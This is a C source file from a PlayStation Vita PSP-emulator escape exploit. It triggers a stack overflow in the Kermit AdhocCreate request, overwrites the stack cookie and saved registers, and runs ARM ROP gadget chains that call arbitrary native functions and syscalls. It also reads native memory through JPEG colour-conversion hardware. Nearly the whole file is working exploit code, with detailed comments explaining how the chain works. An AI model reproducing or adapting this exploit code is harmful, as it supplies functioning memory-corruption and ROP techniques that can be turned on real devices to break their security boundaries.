/* rpc.c -- implementation of the emulator escape
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <pspctrl.h>
#include <cfwmacros.h>

#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "arm.h"
#include "mips.h"
#include "rpc.h"
#include "rop.h"
#include "gadgets.h"

#include "library/libkernel.h"

// Wrappers
int (*read_native)(void* dst, u32 src, size_t len) = (void*)&sceCtrlPeekBufferPositive;
int (*syscall)(int num, ...) = (void*)&sceCtrlPeekBufferNegative;
int (*call)(int func, ...) = (void*)&sceCtrlReadBufferPositive;
int (*init_rpc)(u32 cookie, u32 pspemu_base, u32 libkernel_base) = (void*)&sceCtrlReadBufferNegative;

static u32 stack_cookie, stack_pointer;

static void jpeg_csc(void* pRGBA, const void* pYCbCr, int width, int height, int iFrameWidth, int mode, unsigned int addr)
{
	int work = 0;
	_sceKernelDcacheWritebackInvalidateAll();
	_sceMeRequest(ME_CMD_CSC_INIT, work, pRGBA, pYCbCr, width, height, mode, 0, iFrameWidth);
	_sceMeRequest(ME_CMD_CSC_ROW,  work, addr / width, mode);
}

int _read_native(void* dst, u32 src, size_t len)
{
	unsigned int k1 = pspSdkSetK1(0);

	for (size_t i = 0; i < ALIGN(len, 16); i += 16)
	{
		/*
			1. Copy temp containing Y, Cb and Cr, each of size 8 * 16, into ScePspemuJpegYuvFrameBuffer.
			2. Copy 16 bytes of src into Y component of ScePspemuJpegYuvFrameBuffer.
			3. Copy ScePspemuJpegYuvFrameBuffer into ScePspemuJpegYuvFrameBuffer (no change).
			4. Apply csc on ScePspemuJpegYuvFrameBuffer, where Y contains src and both Cb and Cr are filled with the value 128.
			5. Read every fourth byte of output.
		*/

		u8* temp = (u8*)0xABCD0000;
		memset(temp, 128, 3 * 8 * 16);
		jpeg_csc(temp, (void*)0x08000000, 8, 16, 8, 0b0101, NATIVE(temp));
		jpeg_csc(temp, (void*)0x08000000, 1,  0, 1, 0b0101, src + i);
		jpeg_csc(temp, (void*)0x08000000, 8, 16, 8, 0b0101, 0x66a00000); // ScePspemuJpegYuvFrameBuffer

		for (size_t j = 0; j < MIN(len - i, 16); j++)
			((u8*)dst)[i + j] = temp[j * 4];
	}

	pspSdkSetK1(k1);
	return 0;
}

void push_call(int func, ...)
{
	va_list ap;
	va_start(ap, func);
	push(2, SceLibKernel_pop_r0_pc);              // pc
	push(0, va_arg(ap, int));                     // r0
	push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
	push(0, va_arg(ap, int));                     // r1
	push(0, va_arg(ap, int));                     // r2
	push(2, SceLibKernel_add_sp_8_pop_r4_pc);     // r3
	push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
	push(0, 0xDEADBEEF);                          // dummy
	push(0, 0xDEADBEEF);                          // dummy
	push(0, 0x44444444);                          // r4
	push(2, SceLibKernel_pop_r3_pc);              // pc
	push(0, va_arg(ap, int));                     // r3
	push(0, func);                                // pc
	push(0, va_arg(ap, int));                     // on stack
	push(0, va_arg(ap, int));                     // on stack
	push(0, va_arg(ap, int));                     // r4
	va_end(ap);
}

void push_syscall(int num, ...)
{
	va_list ap;
	va_start(ap, num);
	push(2, SceLibKernel_pop_r0_pc);              // pc
	push(0, va_arg(ap, int));                     // r0
	push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
	push(0, va_arg(ap, int));                     // r1
	push(0, va_arg(ap, int));                     // r2
	push(2, SceLibKernel_pop_pc);                 // r3
	push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
	push(2, SceLibKernel_pop_r3_pc);              // pc
	push(0, va_arg(ap, int));                     // r3
	push(2, SceLibKernel_pop_ip_pc);              // pc
	push(0, num);                                 // ip
	push(1, ScePspemu_syscall);                   // pc
	va_end(ap);
}

static void push_pivot(u32 dst, void* src, int size)
{
	push(2, SceLibKernel_pop_r0_pc);              // pc
	push(0, dst);                                 // r0
	push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
	push(0, NATIVE(src));                         // r1
	push(0, size);                                // r2
	push(2, SceLibKernel_pop_pc);                 // r3
	push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
	push(2, SceLibKernel_sceClibMemcpy);          // pc
	push(2, SceLibKernel_pop_ip_pc);              // pc
	push(0, dst);                                 // ip
	push(2, SceLibKernel_mov_sp_ip_pop_pc);       // pc
}

static void push_prologue(u32 r4, u32 r5, u32 r6, u32 r7)
{
	push(0, stack_cookie);                        // stack cookie
	push(0, r4);                                  // r4
	push(0, r5);                                  // r5
	push(0, r6);                                  // r6
	push(0, r7);                                  // r7
	push(0, 0x88888888);                          // r8
}

static void push_epilogue(void* request)
{
	push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
	push(0, stack_pointer + 0x14);                // r1
	push(0, NATIVE(request));                     // r2
	push(2, SceLibKernel_pop_pc);                 // r3
	push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
	push(1, ScePspemu_str_r2_r1_bx_lr);           // r3
	push(1, ScePspemu_remoteNetAdhocCreate_lr);   // pc
}

int _syscall(int num, ...)
{
	unsigned int k1 = pspSdkSetK1(0);
	unsigned int intc = pspSdkDisableInterrupts();

	char request[sizeof(KermitRequest) + 0x40];
	KermitRequest* request_aligned = (KermitRequest*)ALIGN((u32)request, 0x40);
	KermitRequest* request_uncached = (KermitRequest*)((u32)request_aligned | 0x20000000);
	_sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

	u32 second_rop[64];
	begin_rop(second_rop, sizeof(second_rop));

	// Setup syscall invocation
	va_list ap;
	va_start(ap, num);
	push_syscall(num, va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int));
	va_end(ap);

	push_epilogue(request_uncached);

	int second_rop_size = end_rop();

	u32 rop[32];
	begin_rop(rop, sizeof(rop));

	push_prologue(0x44444444, 0x55555555, 0x66666666, 0x77777777);
	push_pivot(stack_pointer - second_rop_size, second_rop, second_rop_size);

	int rop_size = end_rop();

	// Init param
	KermitAdhocCreateParam param;
	memset(&param, 0, sizeof(param));
	memcpy(param.buf + 0x7c, rop, rop_size);
	param.bufsize = 0x7c + rop_size;

	_sceKernelDcacheWritebackInvalidateAll();
	pspSdkEnableInterrupts(intc);

	// Trigger overflow
	u64 resp;
	_sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
	_sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

	pspSdkSetK1(k1);
	return (int)resp;
}

int _call(int func, ...)
{
	unsigned int k1 = pspSdkSetK1(0);
	unsigned int intc = pspSdkDisableInterrupts();

	char request[sizeof(KermitRequest) + 0x40];
	KermitRequest* request_aligned = (KermitRequest*)ALIGN((u32)request, 0x40);
	KermitRequest* request_uncached = (KermitRequest*)((u32)request_aligned | 0x20000000);
	_sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

	u32 second_rop[64];
	begin_rop(second_rop, sizeof(second_rop));

	// Setup function invocation
	va_list ap;
	va_start(ap, func);
	push_call(func, va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int), va_arg(ap, int));
	va_end(ap);

	push_epilogue(request_uncached);

	int second_rop_size = end_rop();

	u32 rop[32];
	begin_rop(rop, sizeof(rop));

	push_prologue(0x44444444, 0x55555555, 0x66666666, 0x77777777);
	push_pivot(stack_pointer - second_rop_size, second_rop, second_rop_size);

	int rop_size = end_rop();

	// Init param
	KermitAdhocCreateParam param;
	memset(&param, 0, sizeof(param));
	memcpy(param.buf + 0x7c, rop, rop_size);
	param.bufsize = 0x7c + rop_size;

	_sceKernelDcacheWritebackInvalidateAll();
	pspSdkEnableInterrupts(intc);

	// Trigger overflow
	u64 resp;
	_sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
	_sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

	pspSdkSetK1(k1);
	return (int)resp;
}

int _init_rpc(u32 cookie, u32 pspemu_base, u32 libkernel_base)
{
	unsigned int k1 = pspSdkSetK1(0);
	unsigned int intc = pspSdkDisableInterrupts();

	char request[sizeof(KermitRequest) + 0x40];
	KermitRequest* request_aligned = (KermitRequest*)ALIGN((u32)request, 0x40);
	KermitRequest* request_uncached = (KermitRequest*)((u32)request_aligned | 0x20000000);
	_sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

	stack_cookie = cookie;
	stack_pointer = 0;

	register_base(1, pspemu_base);
	register_base(2, libkernel_base);

	u32 rop[32];
	begin_rop(rop, sizeof(rop));

	push_prologue(0x44444444, 0x55555555, 0x66666666, libkernel_base + SceLibKernel_subs_r0_r1_r0_pop_pc);

	// The Trinity writeup describes the following steps:
    // 1. Get the stack pointer
    // 2. Execute arbitrary function
    // 3. Restore SP + 0x14
    // 4. Set the stack pointer to old location
    // 5. Return to correct address
	//
	// The caveat is step 1 is only done once, in `init_rpc`.
	// Step 2 is skipped in `init_rpc`.

	// param.buf copied to sp + 0x98
	// buf + 0x7c = 0x114 (size of alloc)
	// sp + 0x114 = stack cookie
	// so we start overflowing straight into the next alloc.
	//
	// push_epilogue sets this up (cookie, r4 to r8)
	//
	// stack layout:
	// sp + 0x114: stack cookie
	// sp + 0x118: r4
	// sp + 0x11C: r5
	// sp + 0x120: r6
	// sp + 0x124: r7
	// sp + 0x128: r8
	// sp + 0x12C: pc

	// rop chain explained:
	// 
	// remember, as prep, some registers have been set already:
	// r4 = 0xDEADBEEF
	// r5 = 0xDEADBEEF
	// r6 = 0xDEADBEEF
	// r7 = SceLibKernel_subs_r0_r1_r0_pop_pc (important!)
	// r8 = 0xDEADBEEF
	// 
	// gadget 1:
	// SceLibKernel_pop_r0_r1_pc
	//
	// result 1:
	// r0 = 0x5c + 0x10 (0x6c)
	// r1 = 0
	//
	// gadget 2:
	// SceLibKernel_add_r1_sp_5c_blx_r7
	//
	// result 2:
	// r1 = sp + 0x5c
	//
	// gadget 3: (this is in r7)
	// SceLibKernel_subs_r0_r1_r0_pop_pc
	//
	// result 3:
	// r0 = r1 - r0 (r0 = sp - 0x10) [why - 0x10?]
	//
	// gadget 4:
	// SceLibKernel_pop_r1_r2_r3_pc
	//
	// result 4:
	// r1 = &stack_pointer (where we want to save the stack pointer)
	// r2 = request_uncached (per the writeup, to restore a corrupt pointer, not used?)
	// r3 = SceLibKernel_pop_pc
	// 
	// gadget 5:
	// ScePspemu_mov_lr_r3_bx_lr
	//
	// result 5:
	// lr = r3 (SceLibKernel_pop_pc)
	//
	// do note that lr = SceLibKernel_pop_pc is going to be used quite a bit now.
	// gadget 6:
	// SceLibKernel_mov_ip_r0_bx_lr
	//
	// result 6:
	// ip = r0 (ip is some alternative name for r12 that flow really likes; this is saving [sp - 0x10] to ip.)
	// 
	// gadget 7:
	// ScePspemu_str_r0_r1_bx_lr
	//
	// result 7:
	// stack_pointer = r0 [sp - 0x10] (this just saves sp - 0x10 to our variable)
	// 
	// gadget 8:
	// SceLibKernel_pop_r3_pc
	//
	// result 8:
	// r3 = ScePspemu_remoteNetAdhocCreate_lr
	//
	// gadget 9:
	// ScePspemu_str_r3_r0_movs_r0_0_bx_lr
	//
	// result 9:
	// [sp - 0x10] = r3 [ScePspemu_remoteNetAdhocCreate_lr] (what exactly is the point of this?)
	// r0 = 0
	// 
	// gadget 10: (called from lr again)
	// SceLibKernel_mov_sp_ip_pop_pc
	//
	// result 10:
	// sp = ip (sp = sp - 0x10)
	// pc = ScePspemu_remoteNetAdhocCreate_lr
	//

	// questions:
	// where does the 0x10 constant come from?
	// what does it mean?
	//

	// remoteNetAdhocCreate @ 0x81013f0c
	// ScePspemuRemoteNet @ 0x81012e14
	//
	// these are flow's names, probably incorrect.
	// i prefer pspemuRemoteNetThread personally...

	// Get stack pointer and restore context
	push(2, SceLibKernel_pop_r0_r1_pc);           // pc (this is still in remoteNetAdhocCreate's stack)
	push(0, 0x6c + 0x10);                         // r0 sp+0x00 (this is now in ScePspemuRemoteNet's stack)
	push(0, 0);                                   // r1 sp+0x04
	push(2, SceLibKernel_add_r1_sp_6c_blx_r7);    // pc sp+0x08
	push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc sp+0x0C
	push(0, NATIVE(&stack_pointer));              // r1 sp+0x10
	push(0, NATIVE(request_uncached));            // r2 sp+0x14 must point to request (this is the only thing in ScePspemuRemoteNet's stack we must keep the same)
	push(2, SceLibKernel_pop_pc);                 // r3 sp+0x18
	push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc sp+0x1C
	push(2, SceLibKernel_mov_ip_r0_bx_lr);        // pc sp+0x20
	push(1, ScePspemu_str_r0_r1_bx_lr);           // pc sp+0x24
	push(2, SceLibKernel_pop_r3_pc);              // pc sp+0x28
	push(1, ScePspemu_remoteNetAdhocCreate_lr);   // r3 sp+0x2C
	push(1, ScePspemu_str_r3_r0_movs_r0_0_bx_lr); // pc sp+0x30
	push(2, SceLibKernel_mov_sp_ip_pop_pc);       // pc sp+0x34 (pop pc from where?)

	int rop_size = end_rop();
	pspDebugScreenPrintf("rop_size: %d\n", rop_size);

	// Init param
	KermitAdhocCreateParam param;
	memset(&param, 0, sizeof(param));
	memset(param.buf, 0x66, sizeof(param.buf));
	memcpy(param.buf + 0x7c, rop, rop_size);
	param.bufsize = 0x7c + rop_size;

	_sceKernelDcacheWritebackInvalidateAll();
	pspSdkEnableInterrupts(intc);

	// Trigger overflow
	u64 resp;
	_sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
	_sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

	pspDebugScreenPrintf("raw stack_pointer: 0x%08X\n", stack_pointer);

	stack_pointer += 4;

	pspSdkSetK1(k1);
	return stack_pointer;
}
